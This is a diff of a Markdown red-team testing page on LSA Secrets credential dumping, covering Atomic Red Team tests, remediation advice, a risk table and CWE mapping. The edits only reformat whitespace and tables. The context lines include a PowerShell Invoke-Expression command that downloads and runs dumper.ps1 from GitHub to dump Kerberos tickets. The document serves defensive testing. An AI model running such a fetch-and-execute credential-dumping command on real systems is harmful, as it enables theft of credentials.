@@ -83,6 +83,7 @@ https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%2
 ```
 
 **Dependencies:**
+
 - PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})
 
 ### Atomic Test 2: Dump Kerberos Tickets from LSA using dumper.ps1
@@ -99,7 +100,6 @@ Author of dumper.ps1: Michael Zhmaylo (@MzHmO)
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -113,32 +113,32 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1027 Password Policies
+
 Ensure that local administrator accounts have complex, unique passwords across all systems on the network.
 
 ### M1026 Privileged Account Management
+
 Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.
 
 ### M1017 User Training
-Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.
 
+Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.
 
 ## Detection
 
 ### Detection of LSA Secrets Dumping via Registry and Memory Extraction
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| LSA Secrets technique applicable | High | Credential Access |
+| Finding                          | Severity | Impact            |
+| -------------------------------- | -------- | ----------------- |
+| LSA Secrets technique applicable | High     | Credential Access |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                                |
+| ------- | ------------------------------------ |
 | CWE-522 | Insufficiently Protected Credentials |
-
 
 ## References
 
